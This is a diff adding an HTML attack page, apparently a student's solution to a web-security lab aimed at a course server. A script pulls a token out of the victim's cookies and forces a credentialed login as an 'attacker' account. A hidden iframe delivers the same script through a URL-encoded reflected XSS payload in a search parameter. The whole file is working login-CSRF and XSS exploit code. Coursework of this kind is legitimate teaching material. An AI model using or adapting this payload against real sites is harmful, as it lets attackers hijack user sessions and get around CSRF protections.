@@ -1,0 +1,18 @@
+<html><body>
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+      $.get("https://project2.eecs388.org/login?csrfdefense=1&xssdefense=0");
+      var cookie = document.cookie.split(';')[2];
+      console.log(document.cookie);
+      var token = cookie.substring(12);
+               $.ajax({
+                type: 'POST',
+                data: {username: "attacker" , password: "l33th4x", crsf_token: token},
+                url: "https://project2.eecs388.org/login?csrfdefense=1&xssdefense=0",
+                xhrFields: {withCredentials: true}
+               });
+    </script>
+    
+    <iframe src = "https://project2.eecs388.org/search?q=%3Cscript%3E%0D%0A++++++%24.get%28%22https%3A%2F%2Fproject2.eecs388.org%2Flogin%3Fcsrfdefense%3D1%26xssdefense%3D0%22%29%3B%0D%0A++++++var+cookie+%3D+document.cookie.split%28%27%3B%27%29%5B2%5D%3B%0D%0A++++++var+token+%3D+cookie.substring%2812%29%3B%0D%0A+++++++++++++++%24.ajax%28%7B%0D%0A++++++++++++++++type%3A+%27POST%27%2C%0D%0A++++++++++++++++data%3A+%7Busername%3A+%22attacker%22+%2C+password%3A+%22l33th4x%22%2C+crsf_token%3A+token%7D%2C%0D%0A++++++++++++++++url%3A+%22https%3A%2F%2Fproject2.eecs388.org%2Flogin%3Fcsrfdefense%3D1%26xssdefense%3D0%22%2C%0D%0A++++++++++++++++xhrFields%3A+%7BwithCredentials%3A+true%7D%0D%0A+++++++++++++++%7D%29%3B%0D%0A++++%3C%2Fscript%3E" style ="display: none "></iframe>
+</body></html>
+
